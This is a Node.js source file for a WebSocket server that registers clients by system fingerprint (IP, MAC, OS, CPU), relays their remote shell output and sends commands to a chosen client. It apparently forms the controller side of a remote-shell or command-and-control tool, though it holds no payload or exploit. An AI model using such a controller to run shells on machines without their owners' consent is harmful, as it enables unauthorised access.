import { WebSocketServer } from "ws";
import Logger from "./logger.js";
import { EventEmitter } from "events";
import crypto from "crypto";

class WSServer extends EventEmitter {
	constructor(httpServer) {
		super();
		this.wss = new WebSocketServer({ server: httpServer });
		this.clients = new Map();
	}

	start() {
		this.wss.on("connection", this.handleConnection.bind(this));
		Logger.info("WebSocket server started");
	}

	handleConnection(ws) {
		ws.on("message", (data) => this.handleMessage(ws, data));
		ws.on("close", () => this.handleDisconnect(ws));
		Logger.info("New client connected");
	}

	handleMessage(ws, data) {
		try {
			const message = JSON.parse(data);
			
			switch (message.type) {
				case "identify":
					this.handleIdentify(ws, message);
					break;
				case "shell_output":
					this.handleShellOutput(ws, message);
					break;
				case "shell_exit":
					this.handleShellExit(ws);
					break;
			}
		} catch (error) {
			Logger.error(`Failed to handle message: ${error.message}`);
		}
	}

	handleIdentify(ws, data) {
		const shortId = crypto.randomBytes(2).toString('hex').toUpperCase();
		const clientInfo = {
			id: data.id,
			shortId,
			...data.systemInfo,
			ws
		};
		
		this.clients.set(ws, clientInfo);
		Logger.info(`Client identified: ${clientInfo.id} (${shortId})`);
	}

	handleShellOutput(ws, data) {
		const clientInfo = this.clients.get(ws);
		if (!clientInfo) return;

		this.emit("shell_output", clientInfo.id, data.data);
	}

	handleShellExit(ws) {
		const clientInfo = this.clients.get(ws);
		if (!clientInfo) return;

		this.emit("shell_exit", clientInfo.id);
	}

	handleDisconnect(ws) {
		const clientInfo = this.clients.get(ws);
		if (clientInfo) {
			Logger.info(`Client disconnected: ${clientInfo.id} (${clientInfo.shortId})`);
			this.clients.delete(ws);
		}
	}

	broadcast(message) {
		this.clients.forEach((clientInfo) => {
			if (clientInfo.ws.readyState === 1) {
				clientInfo.ws.send(JSON.stringify({
					type: "message",
					data: message
				}));
			}
		});
	}

	sendToClient(clientId, data) {
		for (const [ws, client] of this.clients.entries()) {
			if (client.id === clientId || client.shortId === clientId) {
				if (ws.readyState === 1) {
					ws.send(JSON.stringify(data));
					return true;
				}
			}
		}
		return false;
	}

	getClients() {
		return Array.from(this.clients.values());
	}

	getClientDetails() {
		return this.getClients().map(({ id, shortId, ip, mac, os, platform, arch, memory, cpu, connectedAt }) => ({
			id,
			shortId,
			ip: ip || "unknown",
			mac: mac || "unknown",
			os: os || "unknown",
			platform: platform || "unknown",
			arch: arch || "unknown",
			memory: memory || "unknown",
			cpu: cpu || "unknown",
			connectedAt: connectedAt || new Date().toISOString()
		}));
	}
}

export default WSServer;
